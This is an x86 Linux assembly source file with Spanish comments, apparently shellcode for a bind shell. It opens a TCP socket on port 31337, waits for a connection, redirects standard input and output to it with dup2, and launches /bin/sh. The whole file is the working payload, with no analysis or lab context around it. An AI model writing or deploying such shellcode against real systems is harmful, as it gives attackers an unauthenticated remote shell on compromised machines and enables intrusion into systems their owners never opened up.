section .text
global _start
_start:
xor eax, eax ;
xor ebx, ebx ;
xor ecx, ecx ;
xor edx, edx ;
mov al,0x66  ; __NR_socketcall (syscall al socket)
mov bl, 0x1 ; socket()
push ecx
push 0x6 ;IPPROTO_TCP
push 0x1 ; SOCK_STREAM
push 0x2 ; AF_INET
mov ecx,esp
int 0x80 ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
mov esi, eax ; esi=descriptor de socket
mov al,0x66 ; __NR_socketcall
mov bl,0x2 ;bind()
push edx
push 0x697a ; puerto 31337
push bx
mov ecx,esp
push 0x10
push ecx
push esi
mov ecx,esp
int 0x80 ;bind(socketfd, struct sockaddr *name, socklen_t namelen);
mov al,0x66
mov bl,0x4 ; listen()
push 0x1
push esi
mov ecx,esp
int 0x80
mov al, 0x66
mov bl,0x5 ; accept()
push edx
push edx
push esi
mov ecx,esp
int 0x80 
mov ebx,eax
xor ecx,ecx
mov cl,0x3	;contador a 3
inicio_bucle:
	dec cl	; decremento contador
	mov al,0x3f	;__NR_dup2
	int 0x80
	jne inicio_bucle ; se repite el bucle
xor eax,eax
push edx
push 0x68732f6e
push 0x69622f2f	; se construye la cadena "//bin/sh\0"
mov ebx,esp
push edx
push ebx
mov ecx,esp
push edx
mov edx,esp
mov al,0xb
int 0x80
